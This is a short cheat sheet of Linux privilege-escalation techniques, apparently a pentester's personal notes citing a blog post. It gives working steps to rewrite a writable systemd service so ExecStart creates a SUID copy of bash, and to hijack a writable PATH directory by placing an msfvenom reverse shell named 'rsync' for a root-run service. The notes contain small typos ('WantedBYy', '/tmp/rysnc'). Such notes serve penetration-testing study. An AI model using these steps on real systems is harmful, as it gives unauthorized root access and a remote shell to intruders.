# Writables
-----

https://nozerobit.github.io/linux-privesc-services/

### writable .service file:

```bash
/etc/systemd/system/zeno-monitoring.service
```

```bash
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBYy=multi-user.target
```

Change the command in the ExecStart parameter to execute commands
```bash
ExecStart=cp /bin/bash /tmp/bash; chmod +s /tmp/bash
```

-------------

### writable $PATH variable
- echo $PATH variable to list out the directories set in the $PATH variable.
- If we have write access to any folder in the PATH and there exists a cron job that we can take advantage of, we can write a shell and get root.

- If we have write access to any folder in the PATH and there exists a service configuration file which uses relative paths, we can get a root shell.
```bash
sudo vim /etc/systemd/system/name.service
ExecStart=rsync
```
- Generate a reverse shell using msfvenom and place it in the folder in PATH
```bash
cp /tmp/rysnc /usr/local/bin/rsync
```
- Restart the service
```bash
sudo systemctl restart name.service
```

